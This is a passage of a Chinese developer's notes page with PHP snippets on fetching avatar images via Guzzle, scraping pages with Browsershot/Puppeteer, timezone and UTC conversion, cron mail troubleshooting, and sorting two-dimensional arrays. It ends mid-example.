<h3 id="intervention-image-坑"><a href="#intervention-image-坑" class="headerlink" title="intervention/image 坑"></a>intervention/image 坑</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 记录开始时间</span></span><br><span class="line">$startTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0'</span>;</span><br><span class="line"></span><br><span class="line">$avatar = \Image::make($url);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记录结束时间</span></span><br><span class="line">$endTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">info($startTimestamp);</span><br><span class="line">info($endTimestamp);</span><br><span class="line">info($endTimestamp - $startTimestamp);</span><br><span class="line">$startTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> \GuzzleHttp\Client();</span><br><span class="line"></span><br><span class="line">$url = <span class="string">'http://wx.qlogo.cn/mmopen/XxT9TiaJ1ibf06TNRCMjQADS4opDHvQLguLZHpqkRlvuJYZicvJW4iaOalPsKIs0kpZ3F6864ZzibyObYiaucUQSrdp4pFTNDyIpxw/0'</span>;</span><br><span class="line"></span><br><span class="line">$avatarResponse = $client-&gt;get($url);</span><br><span class="line"></span><br><span class="line">$avatar = \Image::make($avatarResponse-&gt;getBody()-&gt;getContents());</span><br><span class="line"></span><br><span class="line">$endTimestamp = microtime(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">info($startTimestamp);</span><br><span class="line">info($endTimestamp);</span><br><span class="line">info($endTimestamp - $startTimestamp);</span><br><span class="line">先使用 GuzzleHttp 获取头像，再使用 Image::make($data) 创建头像。</span><br></pre></td></tr></table></figure>
<h3 id="puppeteer-采集异步加载的网页内容"><a href="#puppeteer-采集异步加载的网页内容" class="headerlink" title="puppeteer 采集异步加载的网页内容"></a>puppeteer 采集异步加载的网页内容</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ composer <span class="built_in">require</span> spatie/browsershot</span><br><span class="line">$ npm i puppeteer --save</span><br><span class="line">https:<span class="comment">//tianyong90.com/2019/03/10/laravel-zhong-shi-yong-puppeteer-cai-ji-yi-bu-jia-zai-de-wang-ye-nei-rong/#安装</span></span><br><span class="line">use Spatie\Browsershot\Browsershot;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">getBodyHtml</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $newsUrl = <span class="string">'https://m.toutiao.com/i6546884151050502660/'</span>;</span><br><span class="line">    </span><br><span class="line">    $html = Browsershot::url($newsUrl)</span><br><span class="line">        -&gt;windowSize(<span class="number">480</span>, <span class="number">800</span>)</span><br><span class="line">        -&gt;userAgent(<span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36'</span>)</span><br><span class="line">        -&gt;mobile()</span><br><span class="line">        -&gt;touch()</span><br><span class="line">        -&gt;bodyHtml();</span><br><span class="line"></span><br><span class="line">    \Log::info($html);</span><br><span class="line">&#125;</span><br><span class="line">use Spatie\Browsershot\Browsershot;</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">getBodyHtml</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $newsUrl = <span class="string">'https://m.toutiao.com/i6546884151050502660/'</span>;</span><br><span class="line">    </span><br><span class="line">    Browsershot::url($newsUrl)</span><br><span class="line">        -&gt;windowSize(<span class="number">480</span>, <span class="number">800</span>)</span><br><span class="line">        -&gt;userAgent(<span class="string">'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36'</span>)</span><br><span class="line">        -&gt;mobile()</span><br><span class="line">        -&gt;touch()</span><br><span class="line">        -&gt;setDelay(<span class="number">1000</span>)</span><br><span class="line">        -&gt;save(public_path(<span class="string">'images/toutiao.jpg'</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="PHP时区"><a href="#PHP时区" class="headerlink" title="PHP时区"></a>PHP时区</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>，北京英国标准时间时差是<span class="number">8</span>小时。</span><br><span class="line"><span class="number">2</span>，英国伦敦使用夏令时（夏时制）时时差是<span class="number">7</span>小时。</span><br><span class="line">北京时间为东八区的区时UTC+<span class="number">8</span>，英国伦敦为零时区的区时UTC+<span class="number">0</span>，两者时差为<span class="number">8</span>小时；</span><br><span class="line">当英国为夏时制时（提前一小时），时区变为UTC+<span class="number">1</span>，两者时差为<span class="number">7</span>小时。</span><br><span class="line">英国夏令时的区间：从<span class="number">3</span>月最后一个星期日到<span class="number">10</span>月最后一个星期日。</span><br><span class="line">参考：http:<span class="comment">//baike.baidu.com/view/37429.htm</span></span><br><span class="line">时差的计算方法：两个时区标准时间（即时区数）相减就是时差，时区的数值大的时间早。比如中国是东八区(+<span class="number">8</span>)，美国东部是西五区(<span class="number">-5</span>)，两地的时差是<span class="number">13</span>小时，北京比纽约要早<span class="number">13</span>个小时；如果是美国实行夏令时的时期，相差<span class="number">12</span>小时。</span><br><span class="line">英国与北京时间的时差是<span class="number">8</span>个小时，但其中英国属于夏令时国家，如果是夏令时（每年<span class="number">3</span>月最后一个星期日至<span class="number">10</span>月最后一个星期日）期间，中国和英国的时差是<span class="number">7</span>个小时。</span><br><span class="line"></span><br><span class="line"><span class="number">1884</span>年在华盛顿召开的一次国际子午线会议上，规定将全球划分为<span class="number">24</span>个时区（东、西各<span class="number">12</span>个时区），且同时规定了英国为为本初子午线，即零度经线。东<span class="number">1</span><span class="number">-12</span>区，西<span class="number">1</span><span class="number">-12</span>区，每个时区横跨经度<span class="number">15</span>度，时间正好是<span class="number">1</span>小时。最后的东、西第<span class="number">12</span>区各跨经度<span class="number">7.5</span>度，以东、西经<span class="number">180</span>度为界。</span><br><span class="line">中国首都北属于东八区，所以对比英国的零度经线，两者之间相差了<span class="number">8</span>个小时。但因为英国实行夏令时（每年<span class="number">3</span>月最后一个星期日至<span class="number">10</span>月最后一个星期日），则英国在天亮早的夏季人为将时间调快一小时可以使人早起早睡，减少照明量。那么英国与北京时间之间时差是<span class="number">7</span>个小时。</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取美国冬夏时令 //判断当前是否为夏令时，为真返回1，否则为0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAmericanSeason</span>(<span class="params">$market</span>)</span>&#123;</span><br><span class="line">	$localzone = date(<span class="string">"e"</span>);</span><br><span class="line">	<span class="comment">//date_default_timezone_set('US/Pacific-New');</span></span><br><span class="line">	$timezone = in_array($market, array(<span class="string">'LME'</span>, <span class="string">'LIFFE'</span>)) ? <span class="string">'Europe/London'</span> : <span class="string">'US/Pacific-New'</span>;</span><br><span class="line">	$season = date(<span class="string">"I"</span>);</span><br><span class="line">	date_default_timezone_set($localzone);</span><br><span class="line">	<span class="keyword">return</span> $season;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断美国那个时间段是否为夏令时https://gist.github.com/flowerains </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_dst</span>(<span class="params">$timestamp</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $timezone = date(<span class="string">'e'</span>); <span class="comment">//获取当前使用的时区</span></span><br><span class="line">    date_default_timezone_set(<span class="string">'US/Pacific-New'</span>); <span class="comment">//强制设置时区</span></span><br><span class="line">    $dst = date(<span class="string">'I'</span>,$timestamp); <span class="comment">//判断是否夏令时</span></span><br><span class="line">    date_default_timezone_set($timezone); <span class="comment">//还原时区</span></span><br><span class="line">    <span class="keyword">return</span> $dst; <span class="comment">//返回结果</span></span><br><span class="line">&#125;</span><br><span class="line">print gmdate(<span class="string">"Y-m-d\TH:i:s\Z"</span>);</span><br><span class="line">$date_utc = <span class="keyword">new</span> \DateTime(<span class="string">"now"</span>, <span class="keyword">new</span> \DateTimeZone(<span class="string">"UTC"</span>));</span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/8655515/get-utc-time-in-php/18808833</span></span><br><span class="line">echo $date_utc-&gt;format(\DateTime::RFC850); # Saturday, 18-Apr-15 03:23:46 UTC</span><br><span class="line">echo gmdate (<span class="string">"l d F Y H:i:s"</span>).<span class="string">" GMT"</span>; <span class="comment">//输出: Wednesday 09 April 2014 03:53:36 GMT</span></span><br><span class="line">GMT格林威治时间和本地的时间是有时差的, 我们知道php指定时区后用date() 函数获取的是本地时间, 如果想获取标准的GMT 格林威治时间就要用gmdate()函数了</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Converts a local Unix timestamp to GMT</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param   int Unix timestamp</span></span><br><span class="line"><span class="comment">     * @return  int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">local_to_gmt</span>(<span class="params">$time = <span class="string">''</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($time === <span class="string">''</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $time = time();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mktime(</span><br><span class="line">            gmdate(<span class="string">'G'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'i'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'s'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'n'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'j'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'Y'</span>, $time)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">   date_default_timezone_set(<span class="string">'Asia/Calcutta'</span>);</span><br><span class="line">   </span><br><span class="line">   $current_date = date(<span class="string">"Y/m/d g:i A"</span>);</span><br><span class="line">   </span><br><span class="line">   $ist_date = DateTime::createFromFormat(</span><br><span class="line">                           <span class="string">'"Y/m/d g:i A"'</span>,</span><br><span class="line">                           $current_date,</span><br><span class="line">                           <span class="keyword">new</span> DateTimeZone(<span class="string">'Asia/Calcutta'</span>)</span><br><span class="line">                       );</span><br><span class="line">   </span><br><span class="line">   $utc_date = clone $ist_date;</span><br><span class="line">   $utc_date-&gt;setTimeZone(<span class="keyword">new</span> DateTimeZone(<span class="string">'UTC'</span>));</span><br><span class="line">   </span><br><span class="line">   echo <span class="string">'UTC:  '</span> . $utc_date-&gt;format(<span class="string">'Y-m-d g:i A'</span>); </span><br><span class="line">    $time = gmmktime();</span><br><span class="line">    echo date(<span class="string">"Y-m-d H:i:s"</span>, $time); </span><br><span class="line">    date_default_timezone_set(<span class="string">"UTC"</span>);</span><br><span class="line">date(<span class="string">"Y-m-d H:i:s"</span>, time() - date(<span class="string">"Z"</span>))</span><br><span class="line">date_default_timezone_set(<span class="string">'Australia/Brisbane'</span>);</span><br><span class="line">echo gmdate(<span class="string">'c'</span>);<span class="comment">///2018-01-12T16:10:11+00:00</span></span><br><span class="line">最好是一直使用 UTC 时间。服务器使用，自己开发默认也是，然后存入数据库也是，这样的话把数据显示给用户看的话转换为适当时区的日期和时间就行了。</span><br><span class="line">时间戳是指格林尼治时间（GMT）<span class="number">1970</span>年<span class="number">01</span>月<span class="number">01</span>日<span class="number">00</span>时<span class="number">00</span>分<span class="number">00</span>秒到当前时间的总秒数。https:<span class="comment">//www.php.net/manual/en/timezones.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">st_date</span>(<span class="params">$format,$timestamp = false</span>) </span>&#123;</span><br><span class="line">  $timestamp = is_numberic($timestamp) ? $timestamp : time();</span><br><span class="line">  <span class="keyword">return</span> gmdate($format,$timestamp + <span class="number">8</span>*<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line">这样就可以保证这段代码无论在哪里，都可以输出东八区的时间。</span><br><span class="line">$triggerOn = <span class="string">'04/01/2013 03:08 PM'</span>;</span><br><span class="line">$user_tz = <span class="string">'America/Los_Angeles'</span>;</span><br><span class="line"></span><br><span class="line">echo $triggerOn; <span class="comment">// echoes 04/01/2013 03:08 PM</span></span><br><span class="line"></span><br><span class="line">$schedule_date = <span class="keyword">new</span> DateTime($triggerOn, <span class="keyword">new</span> DateTimeZone($user_tz) );</span><br><span class="line">$schedule_date-&gt;setTimeZone(<span class="keyword">new</span> DateTimeZone(<span class="string">'UTC'</span>));</span><br><span class="line">$triggerOn =  $schedule_date-&gt;format(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line"></span><br><span class="line">echo $triggerOn; <span class="comment">// echoes 2013-04-01 22:08:00</span></span><br><span class="line"></span><br><span class="line">格林威治时间（Greenwich Mean Time, GMT）。</span><br><span class="line"></span><br><span class="line">通用协调时间（Universal Time Coordinated, UTC）。UTC的表示方式为：年（y）、月（m）、日（d）、时（h）、分（min）、秒（s），均用数字表示。若以「世界标准时间」的角度来说，UTC比GMT来得更加精准： *UTC = GMT +<span class="regexp">/- 0.9* 。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">本地时间(locale time)：很显然，本地时间跟时区(timezone)有关： *本地时间 = UTC + 时区* 。例如，中国北京标准时间（忽略GMT和UTC的差异）： *CST = GMT + 8 = UTC + 8* 。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Unix时间戳(Unix timestamp)，又称 Unix时间(Unix time) 或 POSIX时间(POSIX time) ，它从格林威治时间1970年01月01日00时00分00秒起至现在的总秒数。</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$usersNow = new DateTime('now', new DateTimeZone("+8"));/</span><span class="regexp">/php5.5+</span></span><br><span class="line"><span class="regexp">echo $usersNow-&gt;format(DateTime::RFC3339);/</span><span class="regexp">/2019-04-18T17:16:12+08:00</span></span><br><span class="line"><span class="regexp">$usersNow = new DateTime('now', new DateTimeZone('+0300'));</span></span><br><span class="line"><span class="regexp">$original = new DateTime("now", new DateTimeZone('UTC'));</span></span><br><span class="line"><span class="regexp">$timezoneName = timezone_name_from_abbr("", 3*3600, false);</span></span><br><span class="line"><span class="regexp">$modified = $original-&gt;setTimezone(new DateTimezone($timezoneName));</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$date = date_create('2000-01-01', timezone_open('Pacific/</span>Nauru<span class="string">'));</span></span><br><span class="line"><span class="string">echo date_format($date, '</span>Y-m-d H:i:sP<span class="string">') . "\n";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">date_timezone_set($date, timezone_open('</span>Pacific/Chatham<span class="string">'));</span></span><br><span class="line"><span class="string">echo date_format($date, '</span>Y-m-d H:i:sP<span class="string">') . "\n";</span></span><br><span class="line"><span class="string">为什么要时间戳？因为从0开始运行的秒数永远相等，即使出现润秒，也并不影响时间戳。</span></span><br><span class="line"><span class="string">php在使用date函数的时候，会依照所在时区去进行计算。date()进行输出的时间，就是我们所说的本地时间。</span></span><br><span class="line"><span class="string">可变：date()不可变：time()、gmdate()</span></span><br><span class="line"><span class="string">// 方法1date('</span>Y-m-d H:i:s<span class="string">',strtotime(gmdate('</span>Y-m-d H:i:s<span class="string">').'</span> +<span class="number">8</span> hours<span class="string">'));</span></span><br><span class="line"><span class="string">// 方法2（推荐）gmdate('</span>Y-m-d H:i:s<span class="string">',time() + 8*3600);</span></span><br><span class="line"><span class="string">$gmt_date = date('</span>Y-m-d H:i:s<span class="string">',time() - date('</span>Z<span class="string">'));</span></span><br><span class="line"><span class="string">$local_time = gmdate('</span>Y-m-d H:i:s<span class="string">',time() + date('</span>Z<span class="string">'));</span></span><br><span class="line"><span class="string">但这和$local_time = date('</span>Y-m-d H:i:s<span class="string">');没有任何结果上的区别。</span></span><br><span class="line"><span class="string">只保存timestamp，也就是time()，它的值是固定的，不随着时区的调整而改变，即使更换了服务器，它的误差也很小，所以有利于今后将程序分发部署到不同的服务器上面。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          function toTimeZone($src, $from_tz = '</span>America/Denver<span class="string">', $to_tz = '</span>Asia/Shanghai<span class="string">', $fm = '</span>Y-m-d H:i:s<span class="string">') &#123;</span></span><br><span class="line"><span class="string">              $datetime = new DateTime($src, new DateTimeZone($from_tz));</span></span><br><span class="line"><span class="string">              $datetime-&gt;setTimezone(new DateTimeZone($to_tz));</span></span><br><span class="line"><span class="string">              return $datetime-&gt;format($fm);</span></span><br><span class="line"><span class="string">          &#125;                                                     </span></span><br><span class="line"><span class="string">$time_zone = "GMT+8";</span></span><br><span class="line"><span class="string">$time = time();</span></span><br><span class="line"><span class="string">$date = date_create(date("Y-m-d H:i", $time), timezone_open('</span>UTC<span class="string">'));</span></span><br><span class="line"><span class="string">$date = date_timezone_set($date, timezone_open($time_zone));</span></span><br><span class="line"><span class="string">$date = date_format($date, '</span>Y-m-d H:i<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo date("Y-m-d H:i:s"); </span></span><br><span class="line"><span class="string">// date() 返回的是:　当前(这一刻 time()函数执行/返回时) GMT标准时间 的"本地化时间" 的自定义格式时间</span></span><br><span class="line"><span class="string">// date()跟php系统设置的时区有关!</span></span><br><span class="line"><span class="string">echo gmdate("Y-m-d H:i:s");</span></span><br><span class="line"><span class="string">// gmdate() 返回的是:　当前(这一刻 time()函数执行/返回时) GMT标准时间  的自定义格式时间</span></span><br><span class="line"><span class="string">// gmdate() 跟你现在所处的位置无关, 跟php系统设置的时区无关!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">也就说，　date()和gmdate()的区别, 仅仅在于 处理的时间 是不同的!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INSERT INTO `table` (id, time) VALUES(NULL, UNIX_TIMESTAMP()); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// or http://cn.voidcc.com/question/p-fvgnwppc-bc.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$time = time(); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$query = "INSERT INTO `table` (id, time) VALUES(NULL, $time); </span></span><br><span class="line"><span class="string">如果你想从数据库中选择它作为一个DATETIME，你可以这样做：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SELECT *, FROM_UNIXTIME(time) as dt FROM `table` WHERE 1 </span></span><br><span class="line"><span class="string">产生的dt栏会格式为yyyy-MM-dd hh:mm:ss。</span></span><br></pre></td></tr></table></figure>
<h3 id="You-have-new-mail-in-var-spool-mail-root"><a href="#You-have-new-mail-in-var-spool-mail-root" class="headerlink" title="You have new mail in /var/spool/mail/root"></a>You have new mail in /var/spool/mail/root</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tac /<span class="keyword">var</span>/spool/mail/root |more</span><br><span class="line">PHP Fatal error:  require_once(): Failed opening required <span class="string">'../Redis/RedisManager.php'</span> (include_path=<span class="string">'.:/usr/local/lib/php</span></span><br><span class="line"><span class="string">/:/usr/share/pear:/usr/share/php'</span>) <span class="keyword">in</span> /cron/test.php on line <span class="number">8</span></span><br><span class="line"></span><br><span class="line">crotnab -e</span><br><span class="line">*<span class="regexp">/5 * * * 1-6 cd /</span>cron/;<span class="regexp">/usr/</span>local/bin/php /cron/test.php -t <span class="number">15</span> </span><br><span class="line"></span><br><span class="line">tail -f /<span class="keyword">var</span>/log/cron</span><br><span class="line">Apr <span class="number">18</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">02</span> xk<span class="number">-6</span><span class="number">-240</span>-a8 CROND[<span class="number">23941</span>]: (root) CMD (<span class="regexp">/usr/</span>lib64/sa/sa1 <span class="number">1</span> <span class="number">1</span>)</span><br><span class="line"> Apr <span class="number">18</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">02</span> xk<span class="number">-6</span><span class="number">-240</span>-a8 CROND[<span class="number">23942</span>]: (root) CMD (cd /cron/;<span class="regexp">/usr/</span>local/bin/php /cron/test.php -t <span class="number">15</span></span><br></pre></td></tr></table></figure>
<h3 id="对二维数组进行排序"><a href="#对二维数组进行排序" class="headerlink" title="对二维数组进行排序"></a>对二维数组进行排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对二维数组进行按字段排序</span></span><br><span class="line"><span class="comment"> * @param array $array 要排序的二维数组</span></span><br><span class="line"><span class="comment"> * @param bool $orderby 根据该字段（二维数组单个元素中的键名）排序</span></span><br><span class="line"><span class="comment"> * @param string $order 排序方式，asc:升序；desc:降序（默认）</span></span><br><span class="line"><span class="comment"> * @param string $children 子元素字段（键名），当元素含有该字段时，进行递归排序</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_orderby</span>(<span class="params">&amp;$array,$orderby = null,$order = <span class="string">'desc'</span>,$children = false</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($orderby == <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">  $key_value = $new_array = array();</span><br><span class="line"></span><br><span class="line">  foreach($array <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">    $key_value[$k] = $v[$orderby];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($order == <span class="string">'asc'</span>) &#123;</span><br><span class="line">    asort($key_value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    arsort($key_value);</span><br><span class="line">  &#125;</span><br><span class="line">  reset($key_value);</span><br><span class="line"></span><br><span class="line">  foreach($key_value <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">    $new_array[$k] = $array[$k];</span><br><span class="line">    <span class="comment">// 如果有children</span></span><br><span class="line">    <span class="keyword">if</span>($children &amp;&amp; isset($new_array[$k][$children])) &#123;</span><br><span class="line">      $new_array[$k][$children] = array_sort($new_array[$k][$children]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $new_array = array_values($new_array); <span class="comment">// 使键名从0开始升序排列</span></span><br><span class="line">  $array = $new_array;</span><br><span class="line">  <span class="keyword">return</span> $new_array;</span><br><span class="line">&#125;</span><br><span class="line">$a = array(</span><br><span class="line">  array(<span class="string">'name'</span> =&gt; <span class="string">'Kenvi'</span>,<span class="string">'age'</span> =&gt; <span class="number">18</span>),</span><br><span class="line">  array(<span class="string">'name'</span> =&gt; <span class="string">'Nance'</span>,<span class="string">'age'</span> =&gt; <span class="number">21</span>),</span><br><span class="line">  .....</span><br><span class="line">);</span><br><span class="line">array_orderby($a,<span 